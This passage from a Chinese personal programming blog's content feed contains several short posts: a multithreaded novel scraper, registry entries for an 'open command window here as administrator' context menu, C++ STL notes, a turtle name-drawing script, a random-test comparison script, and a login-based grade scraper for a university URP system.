class="number">4</span>)], timeout=<span class="number">200</span>)</span><br><span class="line">            req.close()</span><br><span class="line">            result = req.content</span><br><span class="line">            result = BeautifulSoup(result, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">            title = result.find(<span class="string">&#x27;h1&#x27;</span>).getText()</span><br><span class="line">            result = result.find(<span class="string">&#x27;div&#x27;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;content&#x27;</span>&#125;).getText()</span><br><span class="line">            title = re.sub(<span class="string">&#x27;[\\/:*?&quot;&lt;&gt;|\r\n]+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, title)</span><br><span class="line">            print(title)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">&#x27;./%s/%03d&#x27;</span> % (name, page) + <span class="string">&#x27; - &#x27;</span> + title + <span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            print(<span class="string">&#x27;第%d次重连&#x27;</span> % repeat)</span><br><span class="line">            repeat += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> repeat &gt; <span class="number">10</span>:</span><br><span class="line">                print(Host + url + <span class="string">&#x27;爬取失败！&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_menu</span>():</span></span><br><span class="line">    req = requests.get(Host, headers=header[random.randint(<span class="number">0</span>, <span class="number">4</span>)])</span><br><span class="line">    html = req.content</span><br><span class="line">    html = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> name</span><br><span class="line">    name = str(html.find(<span class="string">&#x27;h1&#x27;</span>))[<span class="number">4</span>:<span class="number">-5</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(name):</span><br><span class="line">        os.makedirs(name)</span><br><span class="line">    html = html.find_all(<span class="string">&#x27;dd&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">1024</span>) <span class="keyword">as</span> pool:</span><br><span class="line">        url = []</span><br><span class="line">        index = []</span><br><span class="line">        <span class="keyword">for</span> i, j <span class="keyword">in</span> enumerate(html):</span><br><span class="line">            url.append(j.find(<span class="string">&#x27;a&#x27;</span>)[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">            index.append(i)</span><br><span class="line">        pool.map(geturl, url, index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    get_menu()</span><br><span class="line">    print(<span class="string">&quot;耗时%s&quot;</span> % (time.time() - start))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>注册表相关操作</title>
    <url>/post/11bb3efa/</url>
    <content><![CDATA[<h1 id="在此处打开命令窗口（管理员）"><a href="#在此处打开命令窗口（管理员）" class="headerlink" title="在此处打开命令窗口（管理员）"></a>在此处打开命令窗口（管理员）</h1><h2 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\runas]</span><br><span class="line">@&#x3D;&quot;@shell32.dll,-8506&quot;</span><br><span class="line">&quot;NoWorkingDirectory&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;ShowBasedOnVelocityId&quot;&#x3D;dword:00639bc8</span><br><span class="line">&quot;HasLUAShield&quot;&#x3D;&quot;&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\runas\command]</span><br><span class="line">@&#x3D;&quot;cmd.exe &#x2F;s &#x2F;k pushd \&quot;%V\&quot;&quot;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\runas]</span><br><span class="line">@&#x3D;&quot;@shell32.dll,-8508&quot;</span><br><span class="line">&quot;NoWorkingDirectory&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;ShowBasedOnVelocityId&quot;&#x3D;dword:00639bc8</span><br><span class="line">&quot;HasLUAShield&quot;&#x3D;&quot;&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\runas\command]</span><br><span class="line">@&#x3D;&quot;\&quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\&quot; -windowstyle hidden -Command $stpath &#x3D; pwd; Start-Process PowerShell -ArgumentList \\\&quot;-NoExit\\\&quot;, \\\&quot;-Command Set-Location -literalPath &#39;%V&#39;\\\&quot; -verb RunAs&quot;</span><br></pre></td></tr></table></figure>
<h1 id="相关解释"><a href="#相关解释" class="headerlink" title="相关解释"></a>相关解释</h1><h2 id="项-K"><a href="#项-K" class="headerlink" title="项(K)"></a>项(K)</h2><p><code>runas</code> 管理员运行<br><code>command</code> 运行时执行的命令</p>
<h2 id="字符串值-S-（REG-SZ）"><a href="#字符串值-S-（REG-SZ）" class="headerlink" title="字符串值(S) （REG_SZ）"></a>字符串值(S) （REG_SZ）</h2><p><code>(默认)</code> 显示的名称<br><code>Extended</code> 是否 shift 扩展<br><code>HasLUAShield</code> 是否显示用户账户控制图标<br><code>NoWorkingDirectory</code> 暂时未知</p>
<h2 id="DWORD-32位-值-（D）"><a href="#DWORD-32位-值-（D）" class="headerlink" title="DWORD(32位)值 （D）"></a>DWORD(32位)值 （D）</h2><p><code>ShowBasedOnVelocityId</code> 暂时未知</p>
]]></content>
      <tags>
        <tag>cmd</tag>
        <tag>powershell</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ STL</title>
    <url>/post/5c80f146/</url>
    <content><![CDATA[<h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><p>栈是 <strong>后进先出</strong> (Last In Fisrt Out)的一种特殊的线性表。<br>栈的基本操作如下。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stack&lt;int&gt;S;     &#x2F;&#x2F;定义栈</span><br><span class="line">S.push(x);       &#x2F;&#x2F;入栈</span><br><span class="line">S.pop();         &#x2F;&#x2F;出栈</span><br><span class="line">S.top();         &#x2F;&#x2F;取栈顶元素</span><br><span class="line">S.empty();       &#x2F;&#x2F;判断栈是否为空</span><br><span class="line">S.size();        &#x2F;&#x2F;获取栈的大小</span><br></pre></td></tr></table></figure><br><a id="more"></a><br>栈可以存储多种类型数据,包括但不限于<code>int</code> <code>char</code> <code>string</code> <code>double</code>以及<code>pair</code>等等.<br>入栈是把元素压入栈底;<br>出栈是删除栈顶元素;<br>取栈顶元素只返回元素,不删除;<br>获取栈的大小返回栈內元素数量;<br>栈的判空一般都和 while 循环配套使用,比如下面代码输出栈内所有元素,并清空栈.<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(!S.empty())</span><br><span class="line">&#123;</span><br><span class="line">    cout&lt;&lt;S.top()&lt;&lt;endl;</span><br><span class="line">    S.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">queue&lt;int&gt;Q;	&#x2F;&#x2F;定义队列</span><br><span class="line">Q.push();		&#x2F;&#x2F;入队</span><br><span class="line">Q.font();		&#x2F;&#x2F;返回队头元素</span><br><span class="line">Q.back();		&#x2F;&#x2F;返回队尾元素</span><br><span class="line">Q.pop();		&#x2F;&#x2F;出队</span><br><span class="line">Q.empty();		&#x2F;&#x2F;队列判空</span><br></pre></td></tr></table></figure>
<p>队列是 <strong>先入先出</strong> (Fisrt In Fisrt Out)的一种特殊的线性表.<br>队列队头删除,队尾插值;<br>和栈一样,队列在取元素,删除元素前应确保队列不为空;</p>
<h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">map&lt;key,value&gt;M;	&#x2F;&#x2F;定义map</span><br><span class="line">M[key]&#x3D;value;		&#x2F;&#x2F;map赋值</span><br></pre></td></tr></table></figure>
<p>map为key(键)到value(键值)的映射,底部实现为红黑树.<br>map中的key值不允许重复,且不能改变,按照给定的排序规则对key进行排序.</p>
<h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set&lt;int&gt;S;		&#x2F;&#x2F;定义set</span><br><span class="line">S.insert();		&#x2F;&#x2F;set插值</span><br></pre></td></tr></table></figure>
<p>set是一个有序集合,使用平衡二叉树存储,按照给定的排序规则(默认为less)对set中的数据进行排序.<br>和map一样,set不允许有重复元素.</p>
<h1 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pair&lt;int,int&gt;P;		&#x2F;&#x2F;定义pair</span><br><span class="line">make_pair(a,b);		&#x2F;&#x2F;以a,b的值创建一个新的pair对象</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Turtle绘制字体</title>
    <url>/post/50bbd1a0/</url>
    <content><![CDATA[<p>今天闲着没事，就用python的turtle库绘制了一下自己的名字（其实是老师留的作业）。<br>咳咳，言归正传，我先网上选了个好看又好画的字体，于是保存下载画图打开，这样我们就有了每个笔画的坐标，接下来就开始操作了（嘻嘻）。</p>
<a id="more"></a>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> *</span><br><span class="line">startx, starty = <span class="number">-300</span>, <span class="number">300</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    penup()</span><br><span class="line">    goto(startx + x, starty - y)</span><br><span class="line">    pendown()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">angle, lenth</span>):</span></span><br><span class="line">    seth(angle)</span><br><span class="line">    forward(lenth)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    pensize(<span class="number">6</span>)</span><br><span class="line">    speed(<span class="number">5</span>)</span><br><span class="line">    pencolor(<span class="string">&quot;red&quot;</span>)</span><br><span class="line">    <span class="comment"># G</span></span><br><span class="line">    locate(<span class="number">222</span>, <span class="number">77</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">80</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">130</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">60</span>)</span><br><span class="line">    locate(<span class="number">164</span>, <span class="number">126</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    locate(<span class="number">214</span>, <span class="number">126</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">86</span>)</span><br><span class="line">    <span class="comment"># Y</span></span><br><span class="line">    locate(<span class="number">264</span>, <span class="number">74</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">56</span>)</span><br><span class="line">    locate(<span class="number">340</span>, <span class="number">74</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">56</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">44</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">84</span>)</span><br><span class="line">    <span class="comment"># H</span></span><br><span class="line">    locate(<span class="number">384</span>, <span class="number">74</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">140</span>)</span><br><span class="line">    locate(<span class="number">400</span>, <span class="number">128</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">48</span>)</span><br><span class="line">    locate(<span class="number">460</span>, <span class="number">74</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">140</span>)</span><br><span class="line">    <span class="comment"># 郭</span></span><br><span class="line">    locate(<span class="number">78</span>, <span class="number">285</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">20</span>)</span><br><span class="line">    locate(<span class="number">40</span>, <span class="number">305</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">80</span>)</span><br><span class="line">    locate(<span class="number">50</span>, <span class="number">325</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">25</span>)</span><br><span class="line">    locate(<span class="number">50</span>, <span class="number">325</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">25</span>)</span><br><span class="line">    locate(<span class="number">50</span>, <span class="number">350</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">60</span>)</span><br><span class="line">    locate(<span class="number">46</span>, <span class="number">364</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">20</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">25</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">70</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">30</span>)</span><br><span class="line">    locate(<span class="number">38</span>, <span class="number">402</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">80</span>)</span><br><span class="line">    locate(<span class="number">130</span>, <span class="number">304</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">155</span>)</span><br><span class="line">    locate(<span class="number">130</span>, <span class="number">304</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">42</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">46</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">30</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">30</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># 永</span></span><br><span class="line">    locate(<span class="number">270</span>, <span class="number">295</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">46</span>)</span><br><span class="line">    locate(<span class="number">250</span>, <span class="number">325</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">54</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">128</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">38</span>)</span><br><span class="line">    locate(<span class="number">232</span>, <span class="number">356</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">38</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">38</span>)</span><br><span class="line">    locate(<span class="number">370</span>, <span class="number">356</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">38</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">38</span>)</span><br><span class="line">    <span class="comment"># 航</span></span><br><span class="line">    locate(<span class="number">438</span>, <span class="number">286</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">24</span>)</span><br><span class="line">    locate(<span class="number">428</span>, <span class="number">312</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">140</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">18</span>)</span><br><span class="line">    locate(<span class="number">428</span>, <span class="number">312</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">42</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">140</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">18</span>)</span><br><span class="line">    locate(<span class="number">446</span>, <span class="number">328</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">20</span>)</span><br><span class="line">    locate(<span class="number">414</span>, <span class="number">363</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">56</span>)</span><br><span class="line">    locate(<span class="number">446</span>, <span class="number">383</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">34</span>)</span><br><span class="line">    locate(<span class="number">515</span>, <span class="number">286</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">24</span>)</span><br><span class="line">    locate(<span class="number">478</span>, <span class="number">310</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">80</span>)</span><br><span class="line">    locate(<span class="number">498</span>, <span class="number">342</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">108</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">20</span>)</span><br><span class="line">    locate(<span class="number">498</span>, <span class="number">342</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">42</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">106</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">20</span>)</span><br><span class="line">    hideturtle()</span><br><span class="line">    done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>面重点来了，字不重要，看图！！！<br><img data-src="https://cdn.file.todest.cn/pic/20200511.png" alt=""></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>turtle</tag>
      </tags>
  </entry>
  <entry>
    <title>Python对拍数据</title>
    <url>/post/e6c29894/</url>
    <content><![CDATA[<blockquote>
<p>Version1.0使用文件操作不断将随机测试数据写入code/0.in，通过管道输入到两个可执行文件，然后获取输出进行比较，直到找到不同的输出时停止，此时0.in内的内容即为结果。</p>
</blockquote>
<a id="more"></a>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    f = open(<span class="string">&#x27;./code/0.in&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;此处写生成测试数据函数，注释内容为示例</span></span><br><span class="line"><span class="string">    T = randint(1, 1000)</span></span><br><span class="line"><span class="string">    f.writelines(&#x27;%d\n&#x27; % T)</span></span><br><span class="line"><span class="string">    lists = []</span></span><br><span class="line"><span class="string">        for i in range(T):</span></span><br><span class="line"><span class="string">        while True:</span></span><br><span class="line"><span class="string">            x = randint(1, 1e4)</span></span><br><span class="line"><span class="string">            y = randint(1, 1e4)</span></span><br><span class="line"><span class="string">            if [x, y] not in lists:</span></span><br><span class="line"><span class="string">                lists.append([x, y])</span></span><br><span class="line"><span class="string">                f.writelines(&#x27;%d %d\n&#x27; % (x, y))</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                continue</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:</span><br><span class="line">    os.system(<span class="string">&#x27;CHCP 65001&#x27;</span>)  <span class="comment"># Windows先更换CodePage为UTF-8,以防乱码</span></span><br><span class="line">counts = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./code&#x27;</span>):</span><br><span class="line">    os.makedirs(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;./code/0.in&#x27;</span>):</span><br><span class="line">        os.remove(<span class="string">&#x27;./code/0.in&#x27;</span>)</span><br><span class="line">    generate()</span><br><span class="line">    <span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:  <span class="comment"># Windows系统可执行文件预先放置</span></span><br><span class="line">        ans1 = os.popen(<span class="string">&#x27;type .\\code\\0.in|.\\code\\1.exe&#x27;</span>)</span><br><span class="line">        ans2 = os.popen(<span class="string">&#x27;type .\\code\\0.in|.\\code\\2.exe&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:   <span class="comment"># Linux系统可执行文件预先放置</span></span><br><span class="line">        ans1 = os.popen(<span class="string">&#x27;cat code/0.in | code/1&#x27;</span>)</span><br><span class="line">        ans2 = os.popen(<span class="string">&#x27;cat code/0.in | code/2&#x27;</span>)</span><br><span class="line">    out1 = ans1.read()</span><br><span class="line">    out2 = ans2.read()</span><br><span class="line">    <span class="keyword">if</span> out1 == out2:</span><br><span class="line">        print(<span class="string">&#x27;第&#x27;</span>, counts, <span class="string">&#x27;次尝试: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(out1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    counts = counts + <span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>URP教务管理系统爬取成绩</title>
    <url>/post/7c4a6922/</url>
    <content><![CDATA[<h1 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h1><p><strong>学期成绩</strong>: <code>http://218.196.240.97/bxqcjcxAction.do</code><br><strong>历年成绩</strong>: <code>http://218.196.240.97/gradeLnAllAction.do?oper=qbinfo</code><br><strong>方案成绩</strong>: <code>http://218.196.240.97/gradeLnAllAction.do?oper=fainfo</code><br><strong>打印成绩</strong>: <code>http://218.196.240.27/reportFiles/student/cj_zwcjd_all.jsp</code><br><a id="more"></a></p>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><blockquote>
<p>构建header</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;image/gif, image/jpeg, image/pjpeg,&#x27;</span></span><br><span class="line">              <span class="string">&#x27;application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://218.196.240.97/loginAction.do&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;&#x27;</span></span><br><span class="line">                  <span class="string">&#x27;.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>构建表单</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">form = &#123;</span><br><span class="line">    <span class="string">&#x27;zjh&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mm&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v_yzm&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>获取验证码</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line">req = session.get(host + <span class="string">&#x27;/validateCodeAction.do&#x27;</span>)</span><br><span class="line">cookie = req.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">captcha = open(<span class="string">&#x27;tmp.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">captcha.write(req.content)</span><br><span class="line">captcha.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>登录</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">form[<span class="string">&#x27;zjh&#x27;</span>] = form[<span class="string">&#x27;mm&#x27;</span>] = input()</span><br><span class="line">form[<span class="string">&#x27;v_yzm&#x27;</span>] = input()</span><br><span class="line">os.remove(<span class="string">&#x27;tmp.jpg&#x27;</span>)</span><br><span class="line">req = session.post(host + <span class="string">&#x27;/loginAction.do&#x27;</span>, data=form, headers=headers)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>存为html</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">req = session.get(host + <span class="string">&#x27;/gradeLnAllAction.do?oper=qbinfo&#x27;</span>)</span><br><span class="line">soup = BeautifulSoup(req.content,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">soup = soup.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">soup = soup.replace(<span class="string">&#x27;/css/newcss/&#x27;</span>,<span class="string">&#x27;http://218.196.240.97/css/newcss/&#x27;</span>)</span><br><span class="line">fb = open(<span class="string">&#x27;index.html&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fb.write(soup.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">fb.close()</span><br></pre></td></tr></table></figure>
<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://218.196.240.97&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;image/gif, image/jpeg, image/pjpeg,&#x27;</span></span><br><span class="line">              <span class="string">&#x27;application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://218.196.240.97/loginAction.do&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;&#x27;</span></span><br><span class="line">                  <span class="string">&#x27;.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">form = &#123;</span><br><span class="line">    <span class="string">&#x27;zjh&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mm&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v_yzm&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">req = session.get(host + <span class="string">&#x27;/validateCodeAction.do&#x27;</span>)</span><br><span class="line">cookie = req.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">captcha = open(<span class="string">&#x27;tmp.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">captcha.write(req.content)</span><br><span class="line">captcha.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 